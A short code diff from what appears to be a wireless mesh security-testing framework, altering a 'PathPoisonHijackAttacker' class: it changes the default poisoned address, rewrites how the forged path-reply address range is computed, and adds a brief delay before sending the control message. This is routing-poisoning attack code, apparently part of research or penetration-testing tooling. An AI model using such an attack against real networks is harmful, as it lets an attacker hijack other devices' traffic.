@@ -39,7 +39,7 @@ class PathPoisonHijackConfiguration:
     """
 
     timeout: int = None
-    poison_address: int = 0x0100
+    poison_address: int = 0x0200
     seqnum_start: int = 0x000FFF
     echo_interval: float | None = 7.2
 
@@ -168,12 +168,17 @@ class PathPoisonHijackAttacker(Attacker):
             ),
             dependent_target_unicast_addr_range=UnicastAddr(
                 length_present=1,
-                range_length=(0x7FFF - pkt.destination + 0xFF) & 0xFF,
+                range_length=(
+                    255
+                    if pkt.destination + 255 <= 0x7FFF
+                    else max(1, min(0x7FFF - pkt.destination, 255))
+                ),
                 range_start=pkt.destination,
             ),
         )
 
         upper_transport = self._connector.main_stack.get_layer("upper_transport")
+        sleep(0.01)
         upper_transport.send_control_message(
             (
                 resp_pkt,
